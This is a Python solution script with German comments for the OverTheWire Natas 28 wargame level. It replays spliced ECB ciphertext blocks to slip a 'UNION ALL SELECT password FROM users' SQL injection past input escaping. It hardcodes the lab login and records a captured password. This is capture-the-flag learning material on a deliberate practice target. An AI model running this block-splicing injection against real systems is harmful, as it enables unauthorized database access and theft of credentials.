import requests
import binascii
import urllib
import base64
import string



# cipher is 4 blocks 16 bytes each

# wenn wir 0-10 chars senden:
# 3rd block changes

# wenn wir >10 chars senden:
# 4th block changes

# LAhy3ui8kLEVaROwiiI6Oe


# wenn wir 9a + punkt senden -> wird wie 10 chars gewertet
# wenn wir 9a + ' " oder \ senden, wird es als 11 chars gewertet -> 4th block changes
# außerdem ist 3rd block für unsere sonderzeichen immer gleich
# -> da wird was escaped 3rd block is always aaaaaaaaa\

#[*] last char. = z | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPITVwDo9i6rKdJyANaW7USic4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
#[*] last char. = . | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIIceJ3g0x1znk8bFaqi59Pc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
# changes here:
#[*] last char. = \ | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOfN5woKhSkQjlY0g5eVSYncqM9OYQkTq645oGdhkgSlo=
#[*] last char. = ' | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOstdkbwCSkbjZzJR1FrozncqM9OYQkTq645oGdhkgSlo=
#[*] last char. = " | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOe0uzFQTQyTJF5uPUK3I8gMqM9OYQkTq645oGdhkgSlo=


# select * from database where 'x' in database wird da sicherlich gecallt
# ansatz ist: "AAAAAAAAA' sqlinection more_sqlinjetion" zu senden
# dann kriegen wir die encrypted blöcke von
# "AAAAAAAAA\' sqlinjection more_sql-injection" zurücl
# und können die encrypted 2-n blocks dann replayen -> damit die sanitation (die vorm encrypten statt findet) umgehen
# beim replayen callen wir direkt das search.php script

import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

# First we generate a baseline for the header/footer
data = {'query':10 * 'a'}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
print("result from 10 a's " + baseline)
print(len(baseline))
baseline = base64.b64decode(baseline.encode('utf-8'))
# wir haben 80 bytes als result... das muss so sein weil wir ja 5 blöcke a 16 bytes haben. 5*16 = 80
print(len(baseline))
# die ersten 3 blöcke lassen wir so wie sie sind
header = baseline[:48]
# blöcke 4 -5 sind hier drin
footer = baseline[48:]

# We generate the ciphertext query and parse the result
sqli = 9 * "a" + "' UNION ALL SELECT password FROM users;#"
data = {'query':sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# We compute the size of our payload, how many blocks
# -10 weil uns ja die ersten 10 chars nicht interessieren
nblocks = len(sqli) - 10
print("sqli part len:" + str(nblocks))
# hier wird einfach nur aufgerundet auf 16er
while nblocks % 16 != 0:
    nblocks += 1
print("auf 16er gerundet: "+ str(nblocks))
# hier kriegen wir dann raus aus wie vielen blocks unsere payload besteht (aufgerundet)
nblocks = int(nblocks / 16)
print("encr sqli amount blocks "+ str(nblocks))

# Then, we forge the query
# wir wollen von exploit die ersten 3 blocks rauscutten, wir wollen den clean header ohne escaping
# dann wollen wir vom exploit die sqli encr blocks haben, das sind 3 blocks = exploit[48:(48 + 16 * nblocks)]
# dann hinten den 2 block footer -> 8 blocks final
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
print(len(final))
print(len(final_ciphertext))
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
# hier wird automatisch url encoded...
r = s.get(search_url, params={"query":final_ciphertext})

print(r.text)


# airooCaiseiyee8he8xongien9euhe8b